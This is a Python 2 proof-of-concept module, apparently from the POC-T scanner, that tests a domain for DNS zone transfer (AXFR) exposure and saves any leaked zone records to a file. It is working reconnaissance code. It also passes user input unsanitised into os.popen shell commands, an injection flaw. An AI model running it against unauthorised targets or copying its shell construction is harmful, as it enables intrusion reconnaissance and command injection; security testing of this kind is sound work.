# !/usr/bin/env python
#  -*- coding: utf-8 -*-
# https://github.com/Xyntax/POC-T/blob/master/module/zonetransfer-poc.py
import os
import re
from logger import logger
from lib.data import paths, conf

"""
只能运行在linux环境下
系统需具备两个命令:nslookup,dig(kali里面已有)

输入格式: 不带协议名，不带目录名
[ok]    cdxy.me
[ok]    www.cdxy.me
[ok]    app.air.cdxy.me
[wrong] http://cdxy.me
[wrong] cdxy.me/index.html

会产生以下两种报错(可忽略):
list index out of range
couldn't get address for 'xxx.xxx.xxx.': not found

cdxy May 6 Fri, 2016
"""


def poc(domain):
    try:
        domain = domain.split('.')[-2].strip(' ') + '.' + domain.split('.')[-1].strip(' ')
        cmd_res = os.popen('nslookup -type=ns ' + domain).read()  # fetch DNS Server List
        dns_servers = re.findall('nameserver = (.*?)\n', cmd_res)
        for server in dns_servers:
            cmd_res = os.popen('dig @%s axfr %s' % (server, domain)).read()
            if cmd_res.find('Transfer failed.') < 0 and \
                            cmd_res.find('connection timed out') < 0 and \
                            cmd_res.find('XFR size') > 0:
                f = open(os.path.join(paths.OUTPUT_PATH, 'DNS-zoneTransfer.txt'), 'w')
                f.write(cmd_res)
                f.close()
                return True
        return False
    except Exception, e:
        print e
        return False


def check():
    logger.info('Target domain: ' + conf.TARGET_DOMAIN)
    if poc(conf.TARGET_DOMAIN):
        logger.warning('Vulnerable!')
        logger.info('Save results to %s' % os.path.join(paths.ROOT_PATH,'DNS-zoneTransfer.txt'))
    else:
        logger.info('Not vulnerable.')
